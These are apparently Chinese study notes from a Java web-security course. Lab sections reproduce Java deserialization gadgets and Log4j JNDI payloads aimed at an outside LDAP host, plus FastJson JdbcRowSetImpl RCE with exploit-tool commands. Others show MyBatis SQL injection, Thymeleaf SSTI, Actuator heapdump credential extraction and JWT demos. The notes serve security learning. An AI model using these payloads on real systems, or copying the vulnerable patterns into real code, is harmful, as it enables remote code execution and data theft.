## 安全问题-反序列化利用链
+ 入口类的`readObject`直接调用危险方法（实际很少用）
    - `readObject()`路径：C:\Users\SZZY.jdks\corretto-1.8.0_452\src.zip!\java\io\ObjectInputStream.java

```java
public final Object readObject()
        throws IOException, ClassNotFoundException {
        return readObject(Object.class);
    }
```

```plain
反序列化链

此处在 UserDemo.java 重写readObject方法，执行了计算机
private void readObject(ObjectInputStream ois) throws IOException {
        // 指向正确defaultReadObject
        // ois.defaultReadObject();
        Runtime.getRuntime().exec("calc");
    }
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300902412.png)

+ 入口参数中包含可控类，该类有危险方法，readObject时调用
    - [http://www.dnslog.cn/](http://www.dnslog.cn/)

```java
package com.example.seriatestdemo;

import java.io.*;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;

public class UrlDns implements Serializable {
    public static void main(String[] args) throws IOException, ClassNotFoundException {
        HashMap<URL, Integer> hash = new HashMap<>();
        URL u = new URL("http://pz22ed.dnslog.cn");
        hash.put(u, 1);

        SerializableTest(hash);
        unserializableTest("dns.txt");
    }

    // 序列化
    public static void SerializableTest(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("dns.txt"));
        oos.writeObject(obj);
    }

    // 反序列化
    public static Object unserializableTest(String filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        Object o = ois.readObject();
        return o;
    }
}

```

执行后有dns访问记录序列化对象hash 来源于自带类HashMap



创建对象HashMap，用到原生态 readObject 方法反序列化数据readObject 本来在 ObjectInputStream 里面但是HashMap中也有readObject方法反序列化readObject方法调用HashMap中的readObject方法

```plain
// 执行链：
*	Gadget Chain:
     *	HashMap.readObject()
     *	HashMap.putVal()
     *	HashMap.hash()
     *	URL.hashCode()
```

+ 入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject时调用
+ 构造函数/静态代码块等类加载时隐式执行- 

```java
public String toString() {
         try {
                Runtime.getRuntime().exec("calc");
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
}  

//对obj对象进行输出 默认调用原始对象的toString 方法
System.out.println(obj);
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300901461.png)







# 36-第三方组件&Maven配置&JNDI
## JNDL注入：
[https://blog.csdn.net/qq_29163073/article/details/122951307](https://blog.csdn.net/qq_29163073/article/details/122951307)





<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300900107.png)



## 第三方组件-Log4J
Log4J：控制日志的处理







```java
//	src/main/java/Log4jTest.java
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;


public class Log4jTest {

    //使用Log4j 实现错误日志输出
    private static final Logger logger = LogManager.getLogger(Log4jTest.class);

    public static void main(String[] args) {
//        logger.error("123");
        //如果这个code变量是可控的
        String code="${java:os}";
        logger.error("{}",code);
    }

}
```

输出：

```plain
21:05:45.593 [main] ERROR Log4jTest - Windows 10 10.0, architecture: amd64-64
```



```plain
package com.example.log4jwebdemo;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;


@WebServlet("/log4j")
public class Log4jServlet extends HttpServlet {
    //构造HTTP Web服务 使用带漏洞Log4j版本 实现功能
    private static final Logger log= LogManager.getLogger(Log4jServlet.class);
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        String code =req.getParameter("code");
        //code=$(java:os) 输出执行结果
        //code=(java:os) 正常输入
        //${jndi:ldap://47.94.236.117:1389/uyhyw6}
        //${jndi:ldap://xxxx.dns.log}
        //ldap://47.94.236.117:1389/uyhyw6 生成的远程可访问的调用方法
        //什么方法？ -A "calc" 执行计算机的功能方法（JNDI注入工具生成的）
        log.error("{}",code);

        //1、开发源码中引用漏洞组件如log4j
        //2、开发中使用组件的代码（触发漏洞代码）
        //3、可控变量去传递Payload来实现攻击
    }
}
```



## 第三方组件-FastJson
[https://mvnrepository.com/](https://mvnrepository.com/)



FastJson:将 Java 对象转换为 JSON 格式，当然它也可以将 JSON 字符串转换为 Java 对象。

[https://www.runoob.com/w3cnote/fastjson-intro.html](https://www.runoob.com/w3cnote/fastjson-intro.html)

[https://blog.csdn.net/qq_40205116/article/details/102865704](https://blog.csdn.net/qq_40205116/article/details/102865704)



```java
//	FastjsonTest.java
package com.xiaodi;


import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.serializer.SerializerFeature;

//使用fastjson去处理User类数据
public class FastjsonTest {
    public static void main(String[] args) {
        //u Object对象
        //Integer age String name 字符串数据
        User u = new User();
        u.setAge(30);
        u.setName("xiaodi");
        //System.out.println(u);

        //我们想把数据转换成Json格式数据，我不想用自带的API（太麻烦）
        //我就选择第三方组件fastjson来去做这个功能
        //讲json对象转换json数据
//        String jsonString = JSONObject.toJSONString(u);
//        System.out.println("这就是json格式："+jsonString);

       //分析漏洞利用 多输出 转换数据的类型（类） 告诉大家其实前面有一个@type 转换对象类包
//        String jsonString1 = JSONObject.toJSONString(u, SerializerFeature.WriteClassName);
//        System.out.println(jsonString1);

        //上述对象 -> JSON


        //下面JSON -> 对象


        //String test = "{\"@type\":\"com.xiaodi.User\",\"age\":30,\"name\":\"xiaodi\"}";
        String test = "{\"@type\":\"com.xiaodi.Run\",\"age\":30,\"name\":\"xiaodi\"}";

        //实战中com.xiaodi.Run 我们不知道 固定调用
        //rmi ldap 去触发远程的class 执行代码（RCE）

        JSONObject jsonObject = JSON.parseObject(test);
        System.out.println(jsonObject);

    }
}
```



```java
// Run.java
package com.xiaodi;

import java.io.IOException;

public class Run {
    public Run() throws IOException {
        Runtime.getRuntime().exec("calc");
    }
}
```



```java
//	User.java
package com.xiaodi;


//给fastjson数据转换测试用的
public class User {
    private String name;
    private Integer age;

    public Integer getAge() {
        return age;
    }

    public String getName() {
        return name;
    }


    public void setAge(Integer age) {
        this.age = age;
        System.out.println(age);
    }

    public void setName(String name) {
        this.name = name;
        System.out.println(name);
    }
}
```





# 37-JNDL注入
参考：

[https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/](https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/)

[http://blog.csdn.net/dupei/article/details/120534024](http://blog.csdn.net/dupei/article/details/120534024)

[https://blog.csdn.net/2301_79837041/article/details/137647502](https://blog.csdn.net/2301_79837041/article/details/137647502)



## JNDL
### JNDI-Injection-Exploit
`java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar `

```java
package com.example.jndiinjectdemo;

import javax.naming.InitialContext;
import javax.naming.NamingException;

public class JndiDemo {
    public static void main(String[] args) throws NamingException {
        // 创建一个rmi ldap 等服务调用  实例化对象
        InitialContext ini =  new InitialContext();
        // 调用rmi ldap 等服务对象类 (远程服务)
        //ldap://172.27.169.198:1432/gf3srt = 远程地址的一个.class文件
        ini.lookup("ldap://172.27.169.198:1432/gf3srt");
        ini.lookup("rmi://172.27.169.198:162/gf3srt");
    }
}
```



### marshalsec
```java
package com.example.jndiinjectdemo;

import java.io.IOException;

public class TestJndi {
    public TestJndi() throws IOException {
        Runtime.getRuntime().exec("calc");
    }
}
```

将编译后的文件上传到Linux的目录

```java
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://(有class文件的地址)/#TestJndi
```



**此处注意对JDK版本有要求**

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300902574.png)





## JNDI注入-FastJson漏洞结合
背景：JavaEE中接受用户提交的JSON数据进行转换（FastJson反序列化漏洞）

思路：利用InitialContext.lookup()中的进行JdbcRowSetImpl类JNDI服务注入,漏洞利用FastJsonautotype处理Json对象的时候，未对@type字段进行完整的安全性验证，攻击者可以传入危险类，并调用危险类连接远程RMI主机，通过其中的恶意类执行代码。攻击者通过这种方式可以实现远程代码执行漏洞，获取服务器敏感信息，甚至可以利用此漏洞进一步的对服务器数据进行操作。







### 复现漏洞
```plain
package com.example.fastjsonjndiweb;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;

import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

@WebServlet("/json")
public class Fsweb extends HelloServlet{

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp){
        String jsondata = req.getParameter("str");
        //System.out.println(jsondata);
        JSONObject jsonObject = JSON.parseObject(jsondata);
        System.out.println(jsonObject);
    }
}
```



```html
<%@ page contentType="text/html; charset=UTF-8" pageEncoding="UTF-8" %>
<!DOCTYPE html>
<html>
<head>
    <title>JSP - Hello World</title>

</head>

<body>
<h1><%= "Hello World!" %>
</h1>

<br/>
<a href="hello-servlet">Hello Servlet</a>

<form action = "/FastJsonJndiWeb_war_exploded//json" method = "post">
    please input json data:<input type = "text" name = "str"><br>
    <input type="submit" value="提交">
</form>

</body>

</html>

```



生成远程调用方法

`java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "calc" -A 127.0.0.1`

rmi://127.0.0.1:1099/0junlw



提交JSON  
`{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://127.0.0.1:1099/0junlw","autoCommit":true}`



弹出计算机



# 38-SpringBoot框架
[https://springdoc.cn/spring-boot/](https://springdoc.cn/spring-boot/)





## web应用-路由响应
1、路由映射

```plain
@RequestMapping
@GetMapping
```

2、参数传递

```plain
@RequestParam
```

3、数据响应

```plain
@RestController //相当于@ResponseBody+@Controller
@Controller
```





代码实践：

```plain
package com.example.springboottest;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

@RestController
@Controller
public class IndexController {

    //指定GET请求访问路由
    @RequestMapping(value = "/xiaodiget", method = RequestMethod.GET)
    public String getindex() {
        return "get test";
    }

    //指定POST请求访问路由
    @RequestMapping(value = "/xiaodipost", method = RequestMethod.POST)
    public String getpost() {
        return "post test ";
    }

    //指定GET请求访问路由 带参数名name
    @RequestMapping(value = "/xiaodiget_g", method = RequestMethod.GET)
    // @GetMapping(value = "/xiaodiget")
    public String get_g(@RequestParam String name) {
        return "get test" + name;
    }

    //指定POST请求访问路由 带参数名name
    @RequestMapping(value = "/xiaodipost_p", method = RequestMethod.POST)
    // @GetMapping(value = "/xiaodiget_g")
    public String get_p(@RequestParam String name) {
        return "post test " + name;
    }
}
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300908679.png)





<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300902690.png)



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300900108.png)









<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300900957.png)



## 数据库应用-Mybatis
[JDBC、Hibernate和Mybatis的区别](https://blog.csdn.net/xiaozhezhe0470/article/details/105420763)



### 配置环境：
依赖项：

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300908393.png)

#### 1、数据库创建
<!-- 这是一张图片，ocr 内容为： -->
![](C:/Users/SZZY/AppData/Roaming/Typora/typora-user-images/image-20250616155711895.png)

#### 2、项目添加Mybatis&数据库驱动
<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300901610.png)

#### 3、项目配置数据库连接信息
```yaml
# src/main/resources/application.yml
spring:
  datasource:
    url: jdbc:mysql://localhost:3306/demo01 #注意‘url:’后加空格，下面也是
    username: root
    password: "123456"
    driver-class-name: com.mysql.cj.jdbc.Driver
       
# 我用上面的报错了，所以询问ai重写了一个
spring:
  datasource:
    url: jdbc:mysql://localhost:3306/demo01?useSSL=false&serverTimezone=Asia/Shanghai&characterEncoding=UTF-8
    username: root
    password: "123456"
    driver-class-name: com.mysql.cj.jdbc.Driver
    hikari:
      connection-timeout: 30000
      maximum-pool-size: 20
server:
  port: 8081  
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300859599.png)

#### 4、创建User类用来操作数据库数据
```plain
//	src/main/java/com/example/springbootmybatis/entity/User.java

package com.example.springbootmybatis.entity;

public class User {
    private Integer id;
    private String username;
    private String password;

    public Integer getId() {
        return id;
    }

    public void setId(Integer id) {
        this.id = id;
    }

    public String getUsername() {
        return username;
    }

    public void setUsername(String username) {
        this.username = username;
    }

    public String getPassword() {
        return password;
    }

    public void setPassword(String password) {
        this.password = password;
    }

    @Override
    public String toString() {
        return "User{" +
                "id=" + id +
                ", username='" + username + '\'' +
                ", password='" + password + '\'' +
                '}';
    }
}
```

#### 5、创建Mapper动态接口代理类实现
```plain
// src/main/java/com/example/springbootmybatis/mapper/UserMapper.java

package com.example.springbootmybatis.mapper;

import com.example.springbootmybatis.entity.User;
import org.apache.ibatis.annotations.Mapper;
import org.apache.ibatis.annotations.Select;

import java.util.List;

@Mapper
public interface UserMapper {
    @Select("select * from admin")
    public List<User> findAll();

    @Select("select * from admin where id=1")
    public List<User> findID();
}
```





#### 6、创建Controller实现Web访问调用
```plain
package com.example.springbootmybatis.controller;


import com.example.springbootmybatis.entity.User;
import com.example.springbootmybatis.mapper.UserMapper;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RestController;

import java.util.List;

@RestController
public class GetadminController {

    @Autowired
    private UserMapper UserMapper;

    @GetMapping( "/getadmin")
    public List<User> getadmindata() {
        List<User> all= UserMapper.findAll();
        return all;
    }

    @GetMapping( "/getid")
    public List<User> getadminid() {
        List<User> all= UserMapper.findID();
        return all;
    }
}// src/main/java/com/example/springbootmybatis/controller/GetadminController.java

package com.example.springbootmybatis.controller;

import com.example.springbootmybatis.entity.User;
import com.example.springbootmybatis.mapper.UserMapper;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RestController;

import java.util.List;

@RestController
public class GetadminController {

    @Autowired
    private UserMapper UserMapper;

    @GetMapping( "/getadmin")
    public List<User> getadmindata() {
        List<User> all= UserMapper.findAll();
        return all;
    }

    @GetMapping( "/getid")
    public List<User> getadminid() {
        List<User> all= UserMapper.findID();
        return all;
    }
}
```





<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300901136.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300902826.png)





### sql注入
参考文章：

[https://www.cnblogs.com/2ha0yuk7on/p/16880528.html#tid-EekQNr](https://www.cnblogs.com/2ha0yuk7on/p/16880528.html#tid-EekQNr)

[https://developer.aliyun.com/article/834013](https://developer.aliyun.com/article/834013)



重写接口方法

```plain
// UserMapper.java
public interface UserMapper {

    // @Select("select * from admin")
    @Select("select * from admin where id like '%${id}%'")
    public List<User> findAll(Integer id);

    @Select("select * from admin where id=1")
    public List<User> findID();

}

// GetadminController.java
public class GetadminController {

    @Autowired
    private UserMapper UserMapper;

    @GetMapping( "/getadmin")
    // 注意：此处加上@RequestParam，无法成功注入
    public List<User> getadmindata(Integer id) {
        List<User> all= UserMapper.findAll(id);
        return all;
    }
```



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300901572.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300900683.png)





sql注入：

```sql
select * from admin where id like '%${id}%'

% OR 1=1
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300900709.png)







## 模板引擎-Thymeleaf
<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300900931.png)



### 不安全的模版版本
日常开发中：语言切换页面，主题更换等传参导致的SSTI注入安全问题  
参考:[https://mp.weixin.qq.com/s/NueP4ohS2vSeRCdx4A7yOg](https://mp.weixin.qq.com/s/NueP4ohS2vSeRCdx4A7yOg)



#### **问题：**
此处使用@Controller而非@RestController

[@RestController和@Controller的区别](https://blog.csdn.net/qq_35221138/article/details/79661998)





```plain
// src/main/java/com/example/thyremeafdemo/controller/ThyremeafController.java
package com.example.thyremeafdemo.controller;

import com.sun.org.apache.xml.internal.serializer.AttributesImplSerializer;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

//@RestController有ResponseBody index当做字符串显示操作
//@Controller没有ResponseBody index当做资源文件去渲染
@Controller
public class ThyremeafController {

    @GetMapping("/")
    public String index(Model model){
        model.addAttribute("data","Hello xd");
        return "index";
        //没有模板返回字符串index
        //有模板引用返回index.html
        //index.html 在定义的目录下同名
    }
    @GetMapping("/test")
    public String index(@RequestParam String lang){
        return lang;
    }
    
    @RequestMapping (value = "/")
    public String index(@RequestParam String lang) {
        return lang; // lang=en index-en
    }
}
```





```html
<!--index.html-->
<!DOCTYPE html>
<html xmlns:th="http://www.thymeleaf.org">
<head>
    <meta charset="UTF-8">
    <title>Title</title>

</head>

<body>
<span th:text="${data}">默认值</span>

</body>

</html>

```



新版本没有此漏洞，需要修改版本复现

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300901478.png)





## 监控系统-Actuator
### 功能：
<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300902909.png)



```plain
// application.properties文件配置
server.port=8083
management.endpoints.web.exposure.include=*
```



**服务端&客户端**

```plain
// Server
package com.example.testactuatorserver;

import de.codecentric.boot.admin.server.config.EnableAdminServer;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;

@EnableAdminServer
@SpringBootApplication
public class TestActuatorServerApplication {

    public static void main(String[] args) {
        SpringApplication.run(TestActuatorServerApplication.class, args);
    }
}
```

```plain
server.port=8084
```

```plain
// Clinet
server.port=8085

spring.boot.admin.client.url=http://127.0.0.1:8084
management.endpoints.web.exposure.include=*
management.endpoint.health.show-details=always
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300902976.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300901236.png)





访问`http://127.0.0.1:8085/actuator/heapdump`

自动下载heapdump

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300900482.png)



### 工具
#### JDumpSpider
[https://github.com/whwlsfb/JDumpSpider](https://github.com/whwlsfb/JDumpSpider)

`java -jar .\target\JDumpSpider-1.1-SNAPSHOT-full.jar '<heapfile>'`

#### jvisualvm
jdk1.8/bin/jvisualvm.exe



### 安全问题
参考：

[https://blog.csdn.net/god_zzZ/article/details/122837698](https://blog.csdn.net/god_zzZ/article/details/122837698)

[https://blog.csdn.net/JHIII/article/details/126601858](https://blog.csdn.net/JHIII/article/details/126601858)

分析提取出敏感信息（配置账号密码，接口信息，数据库，短信，云应用等）



提取到数据库信息

```plain
server.port=8086

spring.datasource.url=jdbc:mysql://hocalhost:3306/demo01
spring.datasource.name=root
spring.datasource.password=123456
spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver

management.endpoints.web.exposure.include=*
management.endpoint.health.show-details=always
```



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300901817.png)



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300902873.png)



## 接口系统-Swagger
接口文档生成工具

参考文章：

[https://blog.csdn.net/lsqingfeng/article/details/123678701](https://blog.csdn.net/lsqingfeng/article/details/123678701)



引入依赖包：

```xml
// 2.9.2
<dependency>
    <groupId>io.springfox</groupId>

    <artifactId>springfox-swagger2</artifactId>

    <version>2.9.2</version>

</dependency>

<dependency>
    <groupId>io.springfox</groupId>

    <artifactId>springfox-swagger-ui</artifactId>

    <version>2.9.2</version>

</dependency>

// 3.0.0
<dependency>
  <groupId>io.springfox</groupId>

  <artifactId>springfox-boot-starter</artifactId>

  <version>3.0.0</version>

</dependency>

```

配置文件：

```plain
//  swagger2使用的开启注解是： @EnableSwagger2
//  TestSwaggerDemoApplication.java
@EnableSwagger2

// application.properties
server.port=8087
spring.mvc.pathmatch.matching-strategy=ant_path_matcher

//  在swagger3中，这个注解要换成： @EnableOpenApi
```

访问路径：

2.9.2：[http://127.0.0.1:8087/swagger-ui.html](http://127.0.0.1:8087/swagger-ui.html)

3.0.0:   [http://127.0.0.1:8087/swagger-ui/index.html](http://127.0.0.1:8087/swagger-ui/index.html)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300900930.png)





```plain
package com.example.testswaggerdemo.demos.web;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;

@Controller
public class TestController {

    @GetMapping("/getdata")
    @ResponseBody
    public String getdata(@RequestParam String name) {
        return "get have data" + name;
    }

    @PostMapping("/postdata")
    @ResponseBody
    public String postdata(@RequestParam String name) {
        return "post have data" + name;
    }
}
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300901493.png)







### 安全问题
**接口泄露**：用户登录，信息显示，上传文件等





## 身份鉴权-JWT
参考：

[https://blog.csdn.net/Top_L398/article/details/109361680](https://blog.csdn.net/Top_L398/article/details/109361680)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300902904.png)







#### 1、安装依赖
```xml
<!-- https://mvnrepository.com/artifact/com.auth0/java-jwt -->
        <dependency>
            <groupId>com.auth0</groupId>

            <artifactId>java-jwt</artifactId>

            <version>3.18.0</version>

        </dependency>

```

#### 2、创建jwt
```plain
package com.example.testjwtdemo.demos.web;

import com.auth0.jwt.JWT;
import com.auth0.jwt.algorithms.Algorithm;

import java.io.UnsupportedEncodingException;

public class JwtController {
    //模拟用户jwt身份创建
    public static void main(String[] args) throws UnsupportedEncodingException {
        String jwttoken = JWT.create()
                // 设置header
                //.withHeader()

                // 设置payload
                .withClaim("userid", "1")
                .withClaim("username", "admin")
                .withClaim("password", "123456")

                // 设置时效（JWT过期时间）
                //.withExpiresAt()

                // 设置signature
                .sign(Algorithm.HMAC256("xiaodisec"));
        System.out.println(jwttoken);
    }
}
```



```plain
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNzd29yZCI6IjEyMzQ1NiIsInVzZXJpZCI6IjEiLCJ1c2VybmFtZSI6ImFkbWluIn0.q5Tci9dIVF4bT1t2P4v_QPoM0hPiDyYbGMWH12EG48E
header：eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9
payload：eyJwYXNzd29yZCI6IjEyMzQ1NiIsInVzZXJpZCI6IjEiLCJ1c2VybmFtZSI6ImFkbWluIn0
Signature：q5Tci9dIVF4bT1t2P4v_QPoM0hPiDyYbGMWH12EG48E
```



[https://jwt.io/](https://jwt.io/)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300900132.png)

#### 3、模拟jwt加解密
```plain
package com.example.testjwtdemo.demos.web;

import com.auth0.jwt.JWT;
import com.auth0.jwt.JWTVerifier;
import com.auth0.jwt.algorithms.Algorithm;
import com.auth0.jwt.interfaces.DecodedJWT;

import java.io.UnsupportedEncodingException;

public class JwtController {
    //模拟用户jwt身份创建  jwt加密
    public static void main(String[] args) throws UnsupportedEncodingException {
        String jwttoken = JWT.create()
                // 设置header
                //.withHeader()

                // 设置payload
                .withClaim("userid", "1")
                .withClaim("username", "admin")
                .withClaim("password", "123456")

                // 设置时效（JWT过期时间）
                //.withExpiresAt()

                // 设置signature
                .sign(Algorithm.HMAC256("xiaodisec"));
        System.out.println(jwttoken);
        jwtcheck(jwttoken);
    }


    //模拟身份的检测  jwt解密
    public static void jwtcheck(String jwtdata) throws UnsupportedEncodingException {
        //String jwtdata="eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNzd29yZCI6IjEyMzQ1NiIsInVzZXJpZCI6IjEiLCJ1c2VybmFtZSI6ImFkbWluIn0.q5Tci9dIVF4bT1t2P4v_QPoM0hPiDyYbGMWH12EG48E";

        // 构建解密注册
        JWTVerifier jwt = JWT.require(Algorithm.HMAC256("xiaodisec")).build();

        //解密注册数据
        DecodedJWT verify = jwt.verify(jwtdata);

        //提取注册解密数据 payload部分
        String userid = verify.getClaim("userid").asString();
        String username = verify.getClaim("username").asString();
        String password = verify.getClaim("password").asString();

        System.out.println(userid + username + password);

//        提取header部分
//        verify.getHeader();
//        提取sign签名部分
//        verify.getPayload();
    }
}
/*
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNzd29yZCI6IjEyMzQ1NiIsInVzZXJpZCI6IjEiLCJ1c2VybmFtZSI6ImFkbWluIn0.q5Tci9dIVF4bT1t2P4v_QPoM0hPiDyYbGMWH12EG48E
1admin123456
*/
```



#### 4、web页面
```plain
package com.example.testjwtdemo.demos.web;

import com.auth0.jwt.JWT;
import com.auth0.jwt.JWTVerifier;
import com.auth0.jwt.algorithms.Algorithm;
import com.auth0.jwt.interfaces.DecodedJWT;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.ResponseBody;

import java.io.UnsupportedEncodingException;

@Controller
public class JwtController {
    //模拟用户jwt身份创建  jwt加密
    @PostMapping("/jwtcreate")
    @ResponseBody
    public static String main(Integer id, String user, String pass) throws UnsupportedEncodingException {
        String jwttoken = JWT.create()
                // 设置header
                //.withHeader()

                // 设置payload
                .withClaim("userid", id)
                .withClaim("username", user)
                .withClaim("password", pass)

                // 设置时效（JWT过期时间）
                //.withExpiresAt()

                // 设置signature
                .sign(Algorithm.HMAC256("xiaodisec"));
        System.out.println(jwttoken);
        return jwttoken;
//        jwtcheck(jwttoken);
    }


    //模拟身份的检测  jwt解密
    @PostMapping("/jwtcheck")
    @ResponseBody
    public static void jwtcheck(String jwtdata) throws UnsupportedEncodingException {
        //String jwtdata="eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNzd29yZCI6IjEyMzQ1NiIsInVzZXJpZCI6IjEiLCJ1c2VybmFtZSI6ImFkbWluIn0.q5Tci9dIVF4bT1t2P4v_QPoM0hPiDyYbGMWH12EG48E";

        // 构建解密注册
        JWTVerifier jwt = JWT.require(Algorithm.HMAC256("xiaodisec")).build();

        //解密注册数据
        DecodedJWT verify = jwt.verify(jwtdata);

        //提取注册解密数据 payload部分
        Integer userid = verify.getClaim("userid").asInt();
        String username = verify.getClaim("username").asString();
        String password = verify.getClaim("password").asString();

        System.out.println(userid + username + password);

      if (username.equals("admin")) {
            return "你是admin";
        }else {
            return "你不是admin";
        }
//        提取header部分
//        verify.getHeader();
//        提取sign签名部分
//        verify.getSignature();

    }
}

```

前端页面

```html
<html>
<body>
<h1>hello word!!!</h1>

<p>this is a html page</p>

<form action="../jwtcreate" method="post">
    id:<input type="text" name="id"><br>
    user:<input type="text" name="user"><br>
    pass:<input type="text" name="pass"><br>
    <input type="submit" value="create">
</form>

</body>

</html>

```



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300901363.png)



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300901125.png)

### 安全问题
[https://www.cnblogs.com/tomyyyyy/p/15134420.html#jwt%E4%BD%BF%E7%94%A8%E6%96%B9%E5%BC%8F](https://www.cnblogs.com/tomyyyyy/p/15134420.html#jwt%E4%BD%BF%E7%94%A8%E6%96%B9%E5%BC%8F)

